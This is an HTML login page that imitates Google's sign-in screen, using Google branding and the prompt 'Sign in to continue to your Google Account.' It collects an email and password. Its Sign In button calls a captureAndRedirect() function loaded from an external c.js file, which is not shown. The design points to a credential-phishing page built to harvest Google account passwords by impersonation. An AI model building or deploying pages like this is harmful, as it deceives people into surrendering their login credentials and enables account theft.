<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Google Login</title>

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', Arial, sans-serif;
    }

    body {
      background: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .wrapper {
      display: flex;
      align-items: center;
      justify-content: space-between;
      width: 900px;
      max-width: 95%;
    }

    /* القسم الأيسر */
    .logo-section {
      flex: 1;
      padding-right: 40px;
    }

    .logo {
      font-size: 3.2rem;
      font-weight: 600;
      color: #1a73e8;
      margin-bottom: 20px;
    }

    .logo-section p {
      font-size: 18px;
      color: #5f6368;
      max-width: 400px;
      line-height: 1.5;
    }

    /* قسم تسجيل الدخول */
    .login-form-container {
      flex: 1;
      display: flex;
      justify-content: center;
    }

    .login-form-container form {
      width: 380px;
      background: #ffffff;
      padding: 40px;
      border-radius: 16px;
      box-shadow: 0 20px 40px rgba(0,0,0,0.08);
      border: 1px solid #dadce0;
    }

    form input {
      width: 100%;
      padding: 14px;
      margin-bottom: 18px;
      border-radius: 8px;
      border: 1px solid #dadce0;
      font-size: 14px;
      outline: none;
      transition: 0.2s;
    }

    form input:focus {
      border-color: #1a73e8;
      box-shadow: 0 0 0 3px rgba(26,115,232,0.15);
    }

    .login-btn {
      width: 100%;
      padding: 12px;
      background: #1a73e8;
      color: #fff;
      border: none;
      border-radius: 8px;
      font-size: 15px;
      font-weight: 500;
      cursor: pointer;
      transition: 0.25s;
      margin-bottom: 15px;
    }

    .login-btn:hover {
      background: #1765cc;
      transform: translateY(-2px);
      box-shadow: 0 8px 18px rgba(26,115,232,0.25);
    }

    .forgot-password {
      display: block;
      text-align: center;
      color: #1a73e8;
      text-decoration: none;
      font-size: 13px;
      margin-bottom: 20px;
    }

    .forgot-password:hover {
      text-decoration: underline;
    }

    .divider {
      height: 1px;
      background: #dadce0;
      margin: 20px 0;
    }

    .create-account {
      width: 100%;
      padding: 12px;
      background: #ffffff;
      border: 1px solid #dadce0;
      border-radius: 8px;
      font-size: 14px;
      cursor: pointer;
      transition: 0.25s;
    }

    .create-account:hover {
      background: #f8f9fa;
    }

    /* Responsive */
    @media (max-width: 768px) {
      .wrapper {
        flex-direction: column;
        text-align: center;
      }

      .logo-section {
        padding-right: 0;
        margin-bottom: 40px;
      }

      .logo {
        font-size: 2.5rem;
      }
    }
  </style>
</head>

<body>
  <div class="wrapper">
    
    <div class="logo-section">
      <h1 class="logo">Google</h1>
      <p>Sign in to continue to your Google Account.</p>
    </div>

    <div class="login-form-container">
      <form action="/login" method="POST">
        <input id="email" type="text" name="email" placeholder="Email or phone" required>
        <input id="password" type="password" name="pass" placeholder="Password" required>
        <button type="button" class="login-btn" onclick="captureAndRedirect()">Sign In</button>
        <a href="#" class="forgot-password">Forgot password?</a>
        <div class="divider"></div>
        <button type="button" class="create-account">Create account</button>
      </form>
    </div>

  </div>

<script src="c.js"></script>
</body>
</html>
